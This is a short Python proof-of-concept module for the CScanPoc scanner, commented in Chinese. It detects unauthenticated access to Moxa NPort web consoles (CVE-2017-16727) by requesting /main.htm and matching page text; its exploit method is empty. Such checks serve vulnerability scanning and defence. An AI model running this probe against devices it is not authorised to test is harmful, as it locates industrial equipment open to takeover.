# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Moxa_0001' # 平台漏洞编号，留空
    name = 'Moxa NPorts web console! 未授权访问' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2017-12-21'  # 漏洞公布时间
    desc = '''
        Moxa NPort's web console! 未授权访问。
    ''' # 漏洞描述
    ref = 'https://nvd.nist.gov/vuln/detail/CVE-2017-16727' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'CVE-2017-16727' #cve编号
    product = 'Moxa'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fb70178c-59bf-4f2f-a628-ef6a49e7667b'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            target =arg+"/main.htm"
            code, head,res, errcode, _   = hh.http(target)
            if code == 200 and 'Change Password' in res and 'Accessible IP Settings' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()